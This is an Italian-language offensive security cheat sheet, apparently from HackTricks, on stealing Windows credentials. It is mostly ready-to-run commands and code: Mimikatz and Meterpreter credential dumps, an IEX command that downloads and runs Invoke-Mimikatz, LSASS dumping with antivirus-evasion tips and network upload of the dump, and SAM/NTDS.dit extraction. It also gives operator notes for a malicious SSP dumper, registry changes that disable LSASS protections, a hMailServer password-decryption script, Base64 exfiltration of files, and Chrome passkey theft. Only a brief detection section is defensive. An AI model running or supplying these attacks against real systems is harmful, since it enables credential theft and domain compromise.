# Rubare credenziali Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenziali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trova altre cose che Mimikatz può fare in** [**questa pagina**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Scopri alcune possibili protezioni delle credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credenziali con Meterpreter

Usa il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare password e hash** all'interno del sistema della vittima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Poiché **Procdump di** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**è un tool legittimo di Microsoft**, non viene rilevato da Defender.\
Puoi usare questo tool per **effettuare il dump del processo lsass**, **scaricare il dump** ed **estrarre** le **credenziali localmente** dal dump.

Potresti anche usare [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alcuni **AV** potrebbero **rilevare** come **malevolo** l'uso di **procdump.exe per eseguire il dump di lsass.exe**, perché stanno **rilevando** le stringhe **"procdump.exe" e "lsass.exe"**. È quindi più **stealthy** passare come **argomento** il **PID** di lsass.exe a procdump **anziché** il **nome lsass.exe.**

### Dumping di lsass con **comsvcs.dll**

Una DLL denominata **comsvcs.dll**, presente in `C:\Windows\System32`, è responsabile del **dump della memoria dei processi** in caso di crash. Questa DLL include una **funzione** denominata **`MiniDumpW`**, progettata per essere invocata tramite `rundll32.exe`.\
È irrilevante utilizzare i primi due argomenti, mentre il terzo è suddiviso in tre componenti. Il process ID di cui eseguire il dump costituisce il primo componente, il percorso del file di dump rappresenta il secondo e il terzo componente deve essere esclusivamente la parola **full**. Non esistono opzioni alternative.\
Dopo aver analizzato questi tre componenti, la DLL viene utilizzata per creare il file di dump e trasferire in questo file la memoria del processo specificato.\
È possibile utilizzare **comsvcs.dll** per eseguire il dump del processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio all'indirizzo [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Il seguente comando viene utilizzato per l'esecuzione:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dump di lsass con Task Manager**

1. Fai clic con il pulsante destro del mouse sulla barra delle applicazioni e fai clic su Task Manager
2. Fai clic su More details
3. Cerca il processo "Local Security Authority Process" nella scheda Processes
4. Fai clic con il pulsante destro del mouse sul processo "Local Security Authority Process" e fai clic su "Create dump file".

### Dump di lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un binario Microsoft firmato che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping di lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è un Protected Process Dumper Tool che supporta l'offuscamento del memory dump e il suo trasferimento su workstation remote senza salvarlo sul disco.

**Funzionalità principali**:

1. Bypass della protezione PPL
2. Offuscamento dei file di memory dump per eludere i meccanismi di rilevamento basati sulle signature di Defender
3. Upload del memory dump con metodi di upload RAW e SMB senza salvarlo sul disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – dumping di LSASS basato su SSP senza MiniDumpWriteDump

Ink Dragon include un dumper a tre fasi chiamato **LalsDumper** che non chiama mai `MiniDumpWriteDump`, quindi gli hook EDR su questa API non si attivano:

1. **Loader della fase 1 (`lals.exe`)** – cerca in `fdp.dll` un placeholder composto da 32 caratteri `d` minuscoli, lo sovrascrive con il percorso assoluto di `rtu.txt`, salva la DLL modificata come `nfdp.dll` e chiama `AddSecurityPackageA("nfdp","fdp")`. Questo forza **LSASS** a caricare la DLL malevola come nuovo Security Support Provider (SSP).
2. **Fase 2 all'interno di LSASS** – quando LSASS carica `nfdp.dll`, la DLL legge `rtu.txt`, applica XOR a ogni byte con `0x20` e mappa il blob decodificato in memoria prima di trasferire l'esecuzione.
3. **Dumper della fase 3** – il payload mappato reimplementa la logica di MiniDump usando **syscall dirette** risolte a partire da nomi API sottoposti a hashing (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dedicato chiamato `Tom` apre `%TEMP%\<pid>.ddt`, trasmette un dump compresso di LSASS nel file e chiude l'handle, così l'exfiltration può avvenire in seguito.

Note per l'operatore:

* Mantieni `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` nella stessa directory. La fase 1 sostituisce il placeholder hard-coded con il percorso assoluto di `rtu.txt`, quindi separarli interrompe la catena.
* La registrazione avviene aggiungendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puoi impostare tu stesso quel valore per fare in modo che LSASS ricarichi l'SSP a ogni avvio.
* I file `%TEMP%\*.ddt` sono dump compressi. Decomprimili localmente, quindi passali a Mimikatz/Volatility per l'estrazione delle credenziali.
* L'esecuzione di `lals.exe` richiede privilegi amministrativi/SeTcb affinché `AddSecurityPackageA` abbia esito positivo; al termine della chiamata, LSASS carica in modo trasparente l'SSP rogue ed esegue la fase 2.
* La rimozione della DLL dal disco non la espelle da LSASS. Elimina la voce del registro e riavvia LSASS (riavvio del sistema), oppure lasciala per ottenere persistence a lungo termine.

## CrackMapExec

### Dump degli hash SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump dei segreti LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Eseguire il dump dell'NTDS.dit dal DC target
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump della cronologia delle password di NTDS.dit dal DC target
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostra l'attributo pwdLastSet per ogni account NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Questi file dovrebbero essere **presenti** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Tuttavia, **non puoi semplicemente copiarli nel modo consueto** perché sono protetti.

### From Registry

Il modo più semplice per rubare questi file consiste nell'ottenere una copia dal registro di sistema:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Scarica** quei file sulla tua macchina Kali ed **estrai gli hash** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puoi eseguire la copia di file protetti utilizzando questo servizio. Devi essere Administrator.

#### Utilizzo di vssadmin

Il binario vssadmin è disponibile solo nelle versioni Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ma puoi fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il file SAM** (il disco rigido utilizzato è "C:" e il file viene salvato in C:\users\Public), ma puoi usarlo per copiare qualsiasi file protetto:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Infine, potresti anche utilizzare lo [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per creare una copia di SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenziali di Active Directory - NTDS.dit**

Il file **NTDS.dit** è noto come il cuore di **Active Directory** e contiene dati fondamentali sugli oggetti utente, sui gruppi e sulle relative appartenenze. È qui che vengono archiviati gli **hash delle password** degli utenti del dominio. Questo file è un database **Extensible Storage Engine (ESE)** e si trova in **_%SystemRoom%/NTDS/ntds.dit_**.

All'interno di questo database vengono mantenute tre tabelle principali:

- **Data Table**: questa tabella ha il compito di archiviare i dettagli relativi a oggetti come utenti e gruppi.
- **Link Table**: tiene traccia delle relazioni, come le appartenenze ai gruppi.
- **SD Table**: qui vengono conservati i **descrittori di sicurezza** di ogni oggetto, garantendo la sicurezza e il controllo degli accessi per gli oggetti archiviati.

Ulteriori informazioni: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilizza _Ntdsa.dll_ per interagire con quel file, ed è usato da _lsass.exe_. Di conseguenza, **parte** del file **NTDS.dit** potrebbe trovarsi nella memoria di **`lsass`** (è probabilmente possibile trovare i dati a cui si è avuto accesso più recentemente grazie al miglioramento delle prestazioni ottenuto tramite una **cache**).

#### Decrittazione degli hash all'interno di NTDS.dit

L'hash viene cifrato 3 volte:

1. Decrittare la Password Encryption Key (**PEK**) utilizzando la **BOOTKEY** e **RC4**.
2. Decrittare l'**hash** utilizzando la **PEK** e **RC4**.
3. Decrittare l'**hash** utilizzando **DES**.

La **PEK** ha lo **stesso valore** in ogni domain controller, ma è **cifrata** all'interno del file **NTDS.dit** utilizzando la **BOOTKEY** del file **SYSTEM** del domain controller (è diversa tra i domain controller). Per questo motivo, per ottenere le credenziali dal file NTDS.dit sono necessari i file NTDS.dit e SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Copia di NTDS.dit utilizzando Ntdsutil

Disponibile da Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Potresti anche usare la tecnica del [**volume shadow copy**](#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che ti servirà anche una copia del **file SYSTEM** (di nuovo, [**scaricalo dal registro o usa la tecnica del volume shadow copy**](#stealing-sam-and-system)).

### **Estrazione degli hash da NTDS.dit**

Una volta che hai **ottenuto** i file **NTDS.dit** e **SYSTEM**, puoi usare strumenti come _secretsdump.py_ per **estrarre gli hash**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Puoi anche **estrarli automaticamente** utilizzando un utente domain admin valido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Per i **file NTDS.dit di grandi dimensioni** è consigliato estrarli usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Infine, puoi anche usare il **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ oppure **mimikatz** `lsadump::lsa /inject`

### **Estrazione degli oggetti di dominio da NTDS.dit in un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non vengono estratti solo i segreti, ma anche gli oggetti completi e i relativi attributi, per un'ulteriore estrazione di informazioni quando il file NTDS.dit raw è già stato recuperato.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
L'hive `SYSTEM` è opzionale, ma consente la decrittazione dei secrets (hash NT e LM, supplemental credentials come cleartext passwords, chiavi kerberos o trust, cronologia delle password NT e LM). Insieme ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i relativi hash, flag UAC, timestamp dell'ultimo accesso e della modifica della password, descrizione degli account, nomi, UPN, SPN, gruppi e membership ricorsive, struttura delle organizational units e relativa membership, domini trusted con tipo, direzione e attributi dei trust...

## Lazagne

Scarica il binary da [qui](https://github.com/AlessandroZ/LaZagne/releases). Puoi utilizzare questo binary per estrarre credenziali da diversi software.
```
lazagne.exe all
```
## Altri strumenti per estrarre credenziali da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere utilizzato per estrarre credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrai le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Estrai le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Scaricalo da:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e semplicemente **eseguilo**: le password verranno estratte.

## Mining delle sessioni RDP inattive e indebolimento dei controlli di sicurezza

Il RAT FinalDraft di Ink Dragon include un tasker `DumpRDPHistory`, le cui tecniche sono utili per qualsiasi red-teamer:

### Raccolta della telemetria in stile DumpRDPHistory

* **Target RDP in uscita** – analizza ogni hive utente in `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Ogni sottochiave memorizza il nome del server, `UsernameHint` e il timestamp dell'ultima modifica. Puoi replicare la logica di FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Evidenze RDP in ingresso** – interroga il log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` per gli Event ID **21** (accesso riuscito) e **25** (disconnessione), per determinare chi ha amministrato la macchina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Una volta individuato il Domain Admin che si connette regolarmente, esegui il dump di LSASS (con LalsDumper/Mimikatz) mentre la sua sessione **disconnessa** è ancora presente. CredSSP + il fallback NTLM lasciano il loro verifier e i token in LSASS, che possono poi essere riutilizzati tramite SMB/WinRM per ottenere `NTDS.dit` o predisporre la persistenza sui domain controller.

### Downgrade del Registry mirati da FinalDraft

Lo stesso implant modifica inoltre diverse chiavi del Registry per facilitare il credential theft:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Impostare `DisableRestrictedAdmin=1` forza il riutilizzo completo delle credenziali/dei ticket durante RDP, consentendo pivot in stile pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` disabilita il filtraggio dei token UAC, in modo che gli amministratori locali ottengano token senza restrizioni tramite la rete.
* `DSRMAdminLogonBehavior=2` consente all'amministratore DSRM di effettuare l'accesso mentre il DC è online, offrendo agli attaccanti un altro account integrato con privilegi elevati.
* `RunAsPPL=0` rimuove le protezioni PPL di LSASS, rendendo banale l'accesso alla memoria per dumper come LalsDumper.

## Credenziali del database di hMailServer (post-compromise)

hMailServer memorizza la password del DB in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, nella sezione `[Database] Password=`. Il valore è crittografato con Blowfish usando la chiave statica `THIS_KEY_IS_NOT_SECRET` e scambi di endianess di word da 4 byte. Usa la stringa esadecimale dell'INI con questo snippet Python:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Con la password in chiaro, copia il database SQL CE per evitare i file lock, carica il provider a 32 bit ed esegui l'upgrade se necessario prima di interrogare gli hash:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La colonna `accountpassword` usa il formato hash di hMailServer (modalità hashcat `1421`). Il cracking di questi valori può fornire credenziali riutilizzabili per i pivot WinRM/SSH.
## Intercettazione del callback di logon LSA (LsaApLogonUserEx2)

Alcuni tool catturano le **password di logon in plaintext** intercettando il callback di logon LSA `LsaApLogonUserEx2`. L'idea consiste nell'eseguire l'hook o il wrapping del callback del pacchetto di autenticazione affinché le credenziali vengano catturate **durante il logon** (prima dell'hashing), quindi scritte su disco o restituite all'operatore. Questa tecnica viene comunemente implementata come un helper che esegue l'injection in LSA o vi si registra, quindi registra ogni evento di logon interattivo/di rete completato correttamente con username, dominio e password.

Note operative:
- Richiede privilegi di amministratore locale/SYSTEM per caricare l'helper nel percorso di autenticazione.
- Le credenziali catturate compaiono solo quando avviene un logon (interattivo, RDP, di servizio o di rete, a seconda dell'hook).

## Credenziali di connessione salvate in SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) memorizza le informazioni sulle connessioni salvate in un file `sqlstudio.bin` specifico per ogni utente. I dumper dedicati possono analizzare il file e recuperare le credenziali SQL salvate. Nelle shell che restituiscono solo l'output dei comandi, il file viene spesso esfiltrato codificandolo come Base64 e stampandolo su stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Dal lato dell'operatore, ricostruisci il file ed esegui localmente il dumper per recuperare le credenziali:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Furto di credenziali Passkeys / WebAuthn da Chrome su Windows

Se si ottiene l'**esecuzione di codice** come **utente vittima** su un host Windows che utilizza **Chrome + passkeys sincronizzate con Google Password Manager**, le passkeys diventano un interessante obiettivo di post-exploitation anche **senza privilegi admin/SYSTEM**.

### Artefatti locali interessanti
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** memorizza record **`WebauthnCredentialSpecifics`** codificati con protobuf. Un processo eseguito dallo stesso utente può enumerare l'**RP ID**, il **nome utente**, l'**ID della credenziale** e il materiale della chiave privata crittografato per le passkey sincronizzate.
- **`passkey_enclave_state`** memorizza lo stato locale di registrazione del dispositivo, come **`wrapped_identity_private_key`** e il secret sottoposto a wrapping usato per recuperare le credenziali sincronizzate.

Triage rapido:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### I blob di chiavi vincolati al TPM possono comunque essere sfruttati come oracoli di firma locali

Se il browser esporta una chiave di identità supportata dal TPM come **`NCRYPT_OPAQUE_KEY_BLOB`** e memorizza quel blob in uno stato accessibile all'utente, il malware **non** deve estrarre la chiave privata grezza. Può semplicemente reimportare il blob sulla **stessa macchina** e chiedere al TPM locale di firmare dati controllati dall'attaccante:
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Questo significa che il **binding hardware impedisce l'esportazione off-device, ma non l'uso da parte dello stesso utente sull'endpoint compromesso**.

### Percorsi di abuso pratici

1. **Relay pass-ta-key / device-identity**
- Enumerare `WebauthnCredentialSpecifics` dal LevelDB di Chrome.
- Avviare un login con passkey e ottenere una nuova challenge WebAuthn.
- Usare il blob `wrapped_identity_private_key` rubato sul TPM della vittima per firmare il binding della richiesta cloud-authenticator.
- Inoltrare l'assertion restituita alla relying party.
- Questo è particolarmente utile quando la RP accetta `userVerification=preferred` o non rifiuta le assertion con **`UV=0`**.
2. **Hijack della pending UV-key**
- Forzare un nuovo onboarding eliminando `passkey_enclave_state` o inviando un'operazione `device/forget` firmata validamente.
- Se l'onboarding lascia il dispositivo in **`uv_key_pending`**, registrare una chiave pubblica UV controllata dall'attaccante.
- Se il provider non verifica l'attestazione / l'origine dell'hardware sicuro per la nuova chiave UV, le firme successive della chiave dell'attaccante vengono trattate come **`UV=1`**.
3. **Furto del master-secret / recupero SDS**
- Forzare il recovery o il rejoin affinché Chrome recuperi il master secret delle passkey sincronizzate.
- Monitorare la ricreazione/modifica di `passkey_enclave_state`, quindi eseguire il dump della memoria di Chrome mentre il **security domain secret (SDS)** in chiaro è residente.
- Usare l'SDS recuperato per decrittografare i campi cifrati in ogni record `WebauthnCredentialSpecifics` e recuperare le chiavi private WebAuthn portabili.

### Idee per DFIR / detection

- Monitorare la **cancellazione/ricreazione** di `passkey_enclave_state`.
- Generare un alert per accessi anomali a **`Sync Data\LevelDB`** di Chrome da parte di processi non appartenenti al browser.
- Generare un alert per **dump della memoria di Chrome** o accessi sospetti alla memoria tra processi.
- Analizzare richieste ripetute del **Google Password Manager recovery PIN** o un re-onboarding imprevisto.
- Ricordare che **`signCount`** di WebAuthn spesso non è utile per le passkey sincronizzate, perché può rimanere costante; di conseguenza, la clone detection classica è debole.

## Riferimenti

- [Unit 42 – Un'indagine su anni di operazioni non rilevate contro settori di alto valore](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: phishing con macro VBA di Word tramite SMTP → decrittografia delle credenziali hMailServer → Veeam CVE-2023-27532 per ottenere SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: svelata la relay network e il funzionamento interno di un'operazione offensiva stealth](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Unit 42 – Pass the Passkey: una nuova attack surface nell'autenticazione passwordless](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [Microsoft – `NCryptCreatePersistedKey` / key storage CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)

{{#include ../../banners/hacktricks-training.md}}
